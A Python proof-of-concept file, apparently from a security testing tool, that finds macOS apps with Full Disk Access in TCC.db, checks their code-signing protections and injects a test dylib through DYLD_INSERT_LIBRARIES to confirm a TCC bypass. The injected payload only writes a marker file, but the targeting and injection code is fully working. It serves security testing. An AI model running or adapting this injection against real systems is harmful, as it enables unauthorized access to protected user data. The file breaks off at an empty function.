import os, subprocess, stat, tempfile, time, signal, sqlite3, re
from pathlib import Path

class TCCInjectionPoC:
    """
    Proof-of-concept: DYLD_INSERT_LIBRARIES injection into TCC-granted apps.

    SAFETY:
    - Creates a HARMLESS test dylib that only writes a marker file to /tmp/
    - Target app is launched in a subprocess and killed within 3 seconds
    - No system files are modified
    - No persistent changes to any application
    - All artifacts are in /tmp/ and cleaned up
    """

    MARKER_PREFIX = '/tmp/forge_tcc_poc_'

    def __init__(self):
        self.findings = []
        self.tests = []
        self.confirmed = []
        self.denied = []

    def find_injectable_fda_apps(self):
        """Find apps with Full Disk Access that lack hardened runtime or library validation"""
        candidates = []

        # Query TCC.db for FDA grants
        tcc_path = os.path.expanduser('~/Library/Application Support/com.apple.TCC/TCC.db')
        fda_clients = []
        if os.path.exists(tcc_path):
            try:
                conn = sqlite3.connect('file:%s?mode=ro' % tcc_path, uri=True)
                cursor = conn.execute(
                    "SELECT client, service FROM access WHERE auth_value = 2 AND service LIKE '%AllFiles%'"
                )
                for client, service in cursor:
                    fda_clients.append(client)
                conn.close()
            except (sqlite3.OperationalError, sqlite3.DatabaseError):
                pass

        # Also check system TCC
        sys_tcc = '/Library/Application Support/com.apple.TCC/TCC.db'
        if os.path.exists(sys_tcc):
            try:
                conn = sqlite3.connect('file:%s?mode=ro' % sys_tcc, uri=True)
                cursor = conn.execute(
                    "SELECT client, service FROM access WHERE auth_value = 2 AND service LIKE '%AllFiles%'"
                )
                for client, service in cursor:
                    fda_clients.append(client)
                conn.close()
            except (sqlite3.OperationalError, sqlite3.DatabaseError):
                pass

        # Resolve to binaries and check security
        for client in set(fda_clients):
            binary = self._resolve_binary(client)
            if not binary or not os.path.exists(binary):
                continue

            security = self._check_security(binary)
            if security['injectable']:
                candidates.append({
                    'client': client,
                    'binary': binary,
                    'name': os.path.basename(binary),
                    'security': security,
                    'injection_method': 'DYLD_INSERT' if not security['hardened_runtime'] else 'unsigned_dylib',
                    'risk_level': 'TRIVIAL' if not security['hardened_runtime'] and not security['library_validation'] else 'MODERATE',
                })

        return sorted(candidates, key=lambda c: (
            not c['security']['hardened_runtime'],  # NO-HR first
            not c['security']['library_validation'],
        ), reverse=True)

    def _resolve_binary(self, client):
        """Resolve TCC client to binary path"""
        if client.startswith('/'):
            return client

        # Search /Applications
        if os.path.isdir('/Applications'):
            for item in os.listdir('/Applications'):
                if not item.endswith('.app'):
                    continue
                info_plist = '/Applications/%s/Contents/Info.plist' % item
                if os.path.exists(info_plist):
                    try:
                        import plistlib
                        with open(info_plist, 'rb') as f:
                            plist = plistlib.load(f)
                        if plist.get('CFBundleIdentifier') == client:
                            exe = plist.get('CFBundleExecutable', '')
                            if exe:
                                path = '/Applications/%s/Contents/MacOS/%s' % (item, exe)
                                if os.path.exists(path):
                                    return path
                    except Exception:
                        pass
        return None

    def _check_security(self, binary):
        """Check code signing security posture"""
        result = {
            'hardened_runtime': False,
            'library_validation': False,
            'restricted': False,
            'signed': False,
            'injectable': False,
            'flags_raw': '',
        }

        try:
            r = subprocess.run(['codesign', '-dvv', binary],
                               capture_output=True, text=True, timeout=5)
            output = r.stderr
            result['signed'] = r.returncode == 0
            result['hardened_runtime'] = 'runtime' in output.lower()
            result['library_validation'] = 'library-validation' in output.lower()
            result['restricted'] = 'restrict' in output.lower()

            for line in output.split('\n'):
                if 'flags=' in line.lower() or 'CodeDirectory' in line:
                    result['flags_raw'] += line.strip() + ' '
        except (subprocess.TimeoutExpired, FileNotFoundError):
            pass

        result['injectable'] = not result['hardened_runtime'] or not result['library_validation']
        return result

    def check_dyld_insert_feasibility(self, binary):
        """Check if DYLD_INSERT_LIBRARIES would work (without actually doing it)"""
        result = {
            'feasible': False,
            'reason': '',
            'blockers': [],
        }

        security = self._check_security(binary)

        # Check 1: Hardened runtime blocks DYLD_INSERT
        if security['hardened_runtime']:
            result['blockers'].append('Hardened runtime enabled — DYLD_INSERT blocked by dyld')

        # Check 2: Restricted flag
        if security['restricted']:
            result['blockers'].append('__RESTRICT segment — DYLD env vars stripped')

        # Check 3: Library validation
        if security['library_validation']:
            result['blockers'].append('Library validation — unsigned dylibs rejected')

        # Check 4: SIP-protected path
        if binary.startswith('/System/') or binary.startswith('/usr/'):
            # SIP protects these but DYLD_INSERT still works if binary allows it
            pass

        # Check 5: SUID/SGID — dyld strips DYLD_ vars for SUID
        try:
            st = os.stat(binary)
            if st.st_mode & stat.S_ISUID:
                result['blockers'].append('SUID binary — dyld strips DYLD_ environment variables')
            if st.st_mode & stat.S_ISGID:
                result['blockers'].append('SGID binary — dyld strips DYLD_ environment variables')
        except OSError:
            pass

        if not result['blockers']:
            result['feasible'] = True
            result['reason'] = 'No blockers detected — DYLD_INSERT should work'
        else:
            result['reason'] = 'Blocked by: %s' % '; '.join(result['blockers'])

        return result

    def create_test_dylib_source(self):
        """Create a minimal C source for a harmless test dylib"""
        # This dylib ONLY writes a marker file to /tmp/ when loaded
        source = """
// FORGE TCC Injection PoC - Harmless test dylib
// This ONLY creates a marker file in /tmp/ to prove injection worked
// No system modifications, no persistence, no data access

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>

__attribute__((constructor))
static void forge_poc_loaded(void) {
    // Write marker file to prove we were loaded
    char marker_path[256];
    snprintf(marker_path, sizeof(marker_path), "/tmp/forge_tcc_poc_%d.marker", getpid());

    FILE *f = fopen(marker_path, "w");
    if (f) {
        fprintf(f, "FORGE TCC PoC: dylib loaded into PID %d\\n", getpid());
        fprintf(f, "Process: %s\\n", getprogname());
        fprintf(f, "UID: %d EUID: %d\\n", getuid(), geteuid());
        fclose(f);
    }

    // DO NOT call exit() - let the host process continue briefly
    // The test harness will kill it after checking
}
"""
        return source

    def compile_test_dylib(self):
        """Compile the harmless test dylib"""
        source = self.create_test_dylib_source()
        src_path = '/tmp/forge_tcc_poc.c'
        dylib_path = '/tmp/forge_tcc_poc.dylib'

        with open(src_path, 'w') as f:
            f.write(source)

        try:
            result = subprocess.run(
                ['cc', '-dynamiclib', '-o', dylib_path, src_path,
                 '-target', 'arm64-apple-macos11'],
                capture_output=True, text=True, timeout=30
            )
            if result.returncode == 0 and os.path.exists(dylib_path):
                return dylib_path
            else:
                self.findings.append({
                    'severity': 'INFO',
                    'detail': 'Could not compile test dylib: %s' % result.stderr[:200],
                })
                return None
        except (subprocess.TimeoutExpired, FileNotFoundError):
            return None

    def test_injection(self, binary, dylib_path, timeout=3):
        """
        Test DYLD_INSERT_LIBRARIES injection — SAFELY:
        - Launches target in subprocess with DYLD_INSERT
        - Kills it after timeout seconds
        - Checks for marker file
        - Cleans up all artifacts
        """
        test_result = {
            'binary': binary,
            'name': os.path.basename(binary),
            'injected': False,
            'marker_found': False,
            'detail': '',
            'pid': None,
        }

        # Clean any old markers
        for f in Path('/tmp').glob('forge_tcc_poc_*.marker'):
            f.unlink()

        env = os.environ.copy()
        env['DYLD_INSERT_LIBRARIES'] = dylib_path

        try:
            # Launch with DYLD_INSERT — will be killed quickly
            proc = subprocess.Popen(
                [binary, '--version'],  # Harmless argument
                env=env,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                start_new_session=True,  # Don't affect our process group
            )
            test_result['pid'] = proc.pid

            # Wait briefly for dylib constructor to run
            time.sleep(1.0)

            # Kill the process
            try:
                os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
            except (ProcessLookupError, PermissionError):
                pass
            try:
                proc.kill()
            except (ProcessLookupError, PermissionError):
                pass
            proc.wait(timeout=5)

        except (FileNotFoundError, PermissionError) as e:
            test_result['detail'] = 'Launch failed: %s' % str(e)
            return test_result
        except Exception as e:
            test_result['detail'] = 'Error: %s' % str(e)
            return test_result

        # Check for marker files
        markers = list(Path('/tmp').glob('forge_tcc_poc_*.marker'))
        if markers:
            test_result['injected'] = True
            test_result['marker_found'] = True
            # Read marker content
            try:
                content = markers[0].read_text()
                test_result['detail'] = 'INJECTION CONFIRMED: %s' % content.strip().replace('\n', ' | ')
            except Exception:
                test_result['detail'] = 'INJECTION CONFIRMED (marker exists)'

            self.confirmed.append(test_result)
            self.findings.append({
                'severity': 'CRITICAL',
                'detail': 'TCC BYPASS CONFIRMED: DYLD_INSERT into %s (PID %d)' % (
                    test_result['name'], test_result['pid']),
            })
        else:
            test_result['detail'] = 'Injection blocked (no marker file created)'
            self.denied.append(test_result)

        # Cleanup markers
        for f in Path('/tmp').glob('forge_tcc_poc_*.marker'):
            f.unlink()

        return test_result

    def run_analysis_only(self, candidates):
        """Run analysis WITHOUT actual injection — just feasibility assessment"""
        results = []
        for candidate in candidates:
            feasibility = self.check_dyld_insert_feasibility(candidate['binary'])
            results.append({
                'name': candidate['name'],
                'client': candidate['client'],
                'binary': candidate['binary'],
                'hardened_runtime': candidate['security']['hardened_runtime'],
                'library_validation': candidate['security']['library_validation'],
                'restricted': candidate['security']['restricted'],
                'injection_method': candidate['injection_method'],
                'risk_level': candidate['risk_level'],
                'feasible': feasibility['feasible'],
                'blockers': feasibility['blockers'],
                'reason': feasibility['reason'],
            })
        return results

def demo():
